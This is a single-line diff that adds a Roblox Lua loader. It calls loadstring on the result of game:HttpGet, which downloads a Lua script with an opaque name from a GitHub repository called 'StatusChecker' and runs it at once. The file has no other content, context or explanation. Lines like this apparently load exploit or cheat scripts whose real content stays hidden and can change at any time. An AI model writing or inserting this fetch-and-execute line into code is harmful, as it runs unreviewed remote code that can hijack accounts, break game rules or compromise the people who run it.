@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AC447724/StatusChecker/main/20vxp24sl12.lua'))()
